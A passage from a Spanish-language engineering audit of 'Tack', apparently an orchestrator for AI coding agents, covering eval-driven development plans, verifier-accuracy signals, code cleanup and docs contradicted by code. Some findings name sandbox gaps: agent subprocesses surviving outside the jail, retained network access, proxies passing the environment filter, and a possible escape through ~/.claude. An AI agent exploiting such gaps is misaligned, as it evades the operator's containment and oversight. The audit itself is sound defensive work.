| Calidad del trabajo del agente | **1**: suite live manual que acepta cualquier veredicto |
| Calidad del verificador (prill, Reviewer) | **0–1**: los datos existen y nadie los cruza |
| Coste de los guardrails (ruido) | **0** |

En una frase: **Tack tiene EDD de código y de política, y no de calidad, aunque guarda las etiquetas
para empezar mañana.**

### 6.4 Qué implicaría un EDD robusto en Tack

Hay dos niveles distintos, y conviene no mezclarlos:

- **(a) EDD para desarrollar Tack:** cada cambio en **lo que el agente lee o recibe** se evalúa antes de
  entrar. En Tack eso es:
  - `compose_instructions` y el cercado (`tack-protocol/src/execution/types.rs:554-627`);
  - lo que recibe un run (`tack-app/src/runs/start_run.rs:309-330`);
  - las instrucciones del plan (`tack-db/src/repo/execution/claim.rs:48-67`);
  - la traducción del brief a prill (`tack-runner/src/verify/prill.rs`);
  - las herramientas y aprobaciones por defecto de cada perfil;
  - el digest y los hilos del gestor;
  - la skill de onboarding.
- **(b) Evaluación continua de los equipos del operador:** con las señales que Tack ya registra.

**A. El ciclo por cambio (offline).**

| Paso | Qué ocurre | Ejemplo |
| --- | --- | --- |
| 1. Clasificar | ¿Toca lo que el agente lee o recibe? Si no, basta TDD | "Renombrar un handler: TDD. Cambiar la línea que precede al texto cercado: EDD" |
| 2. Nombrar el eval | La tarjeta dice suite, tareas y umbral | "regression sin rojos nuevos; `planner` sin caída detectable" |
| 3. Eval primero | Si ninguna tarea lo captura, se escribe y se ve fallar | "Tarea nueva: el Planner propone subtareas sin comprobación; hoy, 3/3" |
| 4. Cambiar | El cambio mínimo | — |
| 5. CI | Harness con un agente falso, `check-solutions`, suites de frontera | Bloquea siempre |
| 6. Modelo real | regression más la suite de la tarjeta, pareadas contra la base | "+2 [−3, +7] → sin diferencia detectable" |
| 7. Registrar | Commit, huella de la plantilla, harness, modelo y tarea@versión | Se puede comparar dentro de un mes |

**B. El bucle de producción (online).** Las señales ya existen; falta leerlas por corte, por ventana y
con margen de error:

| Señal que ya se registra | Qué sugiere cuando sube | Dónde está |
| --- | --- | --- |
| Runs Failed o "Not started" | El equipo no resuelve o no encaja | Estado del intento y motivo |
| Revisiones **rechazadas**, con motivo | El agente entrega mal | `attempt_reviews` y revisiones del pack |
| prill dijo `merge` y la persona rechazó, o se revirtió | **Falsa aprobación del verificador** | Pack × revisión × `pull_requests` |
| prill dijo `reject` y la persona aceptó, sin revert | **Falso rechazo del verificador** | ídem |
| Intentos de rework por ítem | Entrega mal a la primera | Runs por ítem, `rework_base` |
| PR revertidos tras un merge | Daño en producción | `pull_requests`, degradación |
| Preguntas **concedidas casi siempre** | Ruido: una pregunta que solo estorba | `execution_decisions` |
| Cortes por tokens o por `step_budget` | Bucles o contexto insuficiente | Eventos del intento |
| Un mismo ítem recurrente, N veces | **pass^k en producción**: ¿lo hace siempre? | Ítems que se repiten (fase 73) |

Lo que se añade:

- **Cortes** por perfil, harness, modelo, equipo y huella de la plantilla, por ventana de tiempo.
- **Matriz de acuerdo del verificador**: pack × revisión × revert, por repositorio y etapa.
- **Aviso de tendencia**: últimos 7 días contra los 28 anteriores, con intervalo de Wilson; avisa solo si
  los intervalos no se solapan. Va al inbox (fase 88).
- **Cierre del bucle**: `promote` convierte un run rechazado o revertido en un candidato a caso (repo en
  el commit base, el ítem y su brief, el motivo de la persona), anonimizado. Una persona decide si entra.

**C. Cadencias y responsables.**

| Cuándo | Qué corre | Quién | ¿Bloquea? |
| --- | --- | --- | --- |
| Cada push | CI, suites de frontera, harness con un agente falso, `check-solutions` | CI | Sí |
| Cada noche | regression con el modelo local, más la tendencia de producción | Máquina del operador | No: avisa |
| Ronda de tarjetas | Suites de las tarjetas + regression, pareadas | Integrador | Sí (criterio de la ronda) |
| Cierre de fase | regression + suite live | Integrador | Sí (criterio de cierre) |
| Cambio de modelo o de herramientas por defecto | capability + verifier, pareadas | Operador | Es su decisión |
| Al tocar un guardrail | safety antes y después | Quien hace la tarjeta | Criterio de la tarjeta |
| Cada semana | Lectura de ~50 runs rechazados o revertidos | Una persona, ~1 h | No |

**D. Qué cambia en las reglas del repo.**

- `CONTRIBUTING.md`: un cambio en lo que el agente lee o recibe nombra su suite, su umbral y su base, y
  escribe primero la tarea si ninguna lo captura.
- `docs/TESTING.md`: una sección "Evals" (el carril, y que un modelo real nunca bloquea CI).
- `CLAUDE.md` y el roadmap: el cierre de fase pasa de "prueba live" a "regression sin rojos nuevos +
  suite live". Las tarjetas que tocan comportamiento llevan el bloque EDD.
- Las ADR se **enmiendan** donde su texto se vuelva falso: la 0013 ("Tack mide al verificador contra las
  personas; sigue sin juzgar") y la 0018 (decisiones 11 y 12, si la jaula o la red cambian). Sin ADR
  nueva.

**E. Costes y riesgos.**

| Coste o riesgo | Magnitud | Cómo se mitiga |
| --- | --- | --- |
| Tiempo de máquina local | ~1–2 h cada noche (estimado) | Un solo slot, de noche |
| Tokens remotos | tareas × repeticiones | Un presupuesto en tokens que fija el mantenedor; Haiku primero |
| Tiempo humano | ~3 h para etiquetar el suite `verifier`, ~1 h a la semana | Una sola persona; las etiquetas de producción salen gratis |
| **Goodhart** | Real con 20 tareas | Tareas reservadas, rotación con candidatos de producción |
| Ruido | Alto con modelo real | Nunca en CI; avisos por tarea con k intentos; los fallos de eval e infra no cuentan |
| Nombres reales | Los candidatos de producción traen el nombre del proyecto | Los candidatos van fuera de git; en el repo solo "My SaaS" |

**F. Lo que NO implica:**

- un modelo real en la CI;
- que la CI necesite docket o prill;
- cifras en dólares;
- una ADR nueva;
- duplicar el harness de evals de docket para los equipos de docket (cada sistema mide lo suyo; Tack
  aporta las etiquetas);
- que Tack se convierta en juez: sigue sin juzgar el trabajo, mide a quien juzga.

---

## 7. Qué sobra: limpieza (legacy o sin valor)

Criterio: se borra lo que está muerto, lo duplicado y lo que se presenta como algo que no es. La
confianza dice qué tan seguro es borrarlo **hoy**.

### 7.1 Guardrails y runner

| # | Candidato | Por qué | Qué hacer | Confianza |
| --- | --- | --- | --- | --- |
| L1 | `crates/tack-runner/src/harness/event_sink.rs` (175 líneas) | Nada lo llama en producción [código✓]; su doc dice que la conexión es "future work" | Borrarlo, con la mención en `redact.rs:1` | **alta** |
| L2 | `PromptSummary` (`redact.rs:118-142`), `SecretMaterial::is_empty`, `LocalProcessHarness::with_sandbox` (`local_process.rs:625`) | Solo los usan los tests | Borrar o mover al soporte de tests | media-alta |
| L3 | Lista "cambió cómo se le revisa" en Tack (`checked_files.rs`) frente a la de docket | Dos listas, distinto efecto (anotar frente a retener) | La de Tack, ampliada y que retiene el merge (plan GR9), se aplica a **los cuatro agentes**, docket incluido, sobre el diff que Tack captura. La de docket sigue siendo suya y retiene **durante** el run. Son dos momentos, no dos dueños del mismo | media |
| L4 | Dos almacenes de revisión humana (pack y run), con el revisor fijo en `"operator"` | Duplican la idea; uno exige motivo y el otro no (contra la ADR 0013) | Una revisión con motivo obligatorio y el principal real | media (migración de datos) |
| L5 | Dólares en las métricas: `cost_usd`, `qualified_per_usd` y la tarifa (`tack-core/src/rate_card.rs`, `handlers/metrics.rs:104-112`) | Contradicen "solo tokens" (ADR 0024) | **Decisión del mantenedor**: borrar o justificar | lo decide el mantenedor |
| L6 | Compatibilidad: `status_map_policy_id` → `STATUS_SET_BY_A_PERSON`; el rechazo de la tabla `[provider]` (`tack-runner/src/error.rs:11-15`) | Se cierran ante la duda, así que son inofensivos, pero son código de transición | Borrar con la release `v0.2.0-beta.1` | media |
| L7 | `never_started` reconoce el **texto** `"ceiling L<n>"` de docket | Frágil | Pedirle a docket un código negociado por `features`; mientras tanto, se queda | baja |
| L8 | `subtasks-from-plan`, el texto de `ItemSource::Plan` ("A subtask…") después de la fase 93 | Nombres de un tipo que ya no existe | Renombrar ruta y textos. **El campo `"subtasks"` de `plan-v1` es contrato: no se toca** | media |
| L9 | El doc de `Principal::is_operator` dice "or Tack itself" | El código no lo hace | Corregir el comentario | **alta** |
| L10 | La lista fija de alias de modelo de Claude en `readiness.rs:12` | Envejece | Leerla de la CLI cuando la exponga; mientras tanto, se queda | baja |

### 7.2 Evals y su maquinaria

| # | Candidato | Por qué | Qué hacer | Confianza |
| --- | --- | --- | --- | --- |
| E1 | `crates/tack-runner/tests/docket_v5.rs` | Se llama v5 y el mínimo es la API 6 | Renombrarlo `docket_api.rs` **después** de que entre el cambio sin commit de la otra sesión | **alta** |
| E2 | `needs_beta_6()` (`docket/probe.rs:32`) devuelve "0.3.0-beta.1" | El nombre miente | Renombrarla según lo que comprueba | **alta** |
| E3 | `onboarding-lab/`: los dos `.bak-2026-11-04`, un archivo llamado `-`, y el encabezado "0.2.0-beta.6 or later" de `docket-prill-e2e.sh:9` | Restos (fuera de git) | Borrar los restos y corregir el encabezado | **alta** |
| E4 | `frontend/e2e/table.spec.ts` | La vista Table se quitó en la fase 84; el spec prueba la List | Renombrarlo `list.spec.ts` | **alta** |
| E5 | Caminos felices de la suite live que aceptan cualquier veredicto (`spec.ts:973`) | Es un test de flujo que parece un eval | **Se queda** como test de flujo, dicho en su encabezado; el eval de calidad lo hace el harness del plan | mantener |
| E6 | `tests/briefing_schema.rs` (`#[ignore]`) | Solo corre con `--check` | **Se queda**: la CI nunca necesita prill | mantener |
| E7 | `client.rs:214` dice que `InPlace` "not provisioned yet" | Ya existe (`git.rs:632-636`) | Corregir el comentario | **alta** |

### 7.3 Documentación que el código desmiente

| Documento | Lo que dice | Lo que hace el código |
| --- | --- | --- |
| ADR 0004 (líneas 23-25 y 93) y ADR 0032 (líneas 71-73) | Loopback sin autenticación | Siempre hay token (ADR 0018, decisión 1; `config.rs:216`) |
| ADR 0036:56 | "Un equipo que no encaja se rechaza antes de enviar" (el tablero) | Lo rechaza el runner; el tablero lo muestra |
| ADR 0027, decisión 4 | "Red solo mientras instala" | El agente conserva la red |
| ADR 0021:57 | Un límite de WIP en auto-start | No existe; solo `max_open` |
| ADR 0018, decisión 10 | "Se matan el grupo y la sesión" | Los subprocesos de `Bash` de Claude Code sobreviven sin jaula |
| ADR 0024, decisión 1 | "Ningún límite por defecto" | 2M provisional (ADR 0027, decisión 5), sin nota de enmienda en la 0024 |
| ADR 0013 | "Toda revisión lleva un motivo" | La revisión del run tiene la nota opcional |
| `docs/contracts/mrp-v1/README.md:30` | `evidence_sha256` = huella del directorio de evidencia | Es la huella de `evidence.json` (`prill.rs:254`) |
| `tack-core/src/rate_card.rs:1-4` | "the scheduler's dollar budget" | Lo quitó la ADR 0024 |
| `env_policy.rs:1-6` | Bloquea lo que cambia "where its traffic goes" | Deja pasar los proxies (G11) |

---

## 8. Límites de esta auditoría

- No ejecuté nada. Los recuentos salen de buscar en el código y son aproximados; las líneas citadas
  pueden haberse movido ±2.
- Los tres inventarios los hicieron agentes. Verifiqué a mano los quince hallazgos de Método, no todos.
  Lo marcado *(inferido)* no está comprobado:
  - macOS sin jaula;
  - el escape por `~/.claude`;
  - `.git/hooks` en modo `in_place`;
  - la idempotencia de `subtasks-from-plan`;
  - en Codex, que `on-request` deja al modelo decidir, que su sandbox corta la red por defecto y que
    carga los MCP de `~/.codex/config.toml`;
  - que los subprocesos sobreviven también en Codex y opencode.
- Las fuentes externas de 2026 vienen de la auditoría de docket y no se abrieron aquí. La lista OWASP
  ASI es secundaria.
- Lo que digo de docket sale de su auditoría (**[docket]**), salvo lo que se ve desde el código de Tack
  (`probe.rs`, `task.rs`).
- La suite live y sus resultados están fuera de git; los leí en esta máquina.
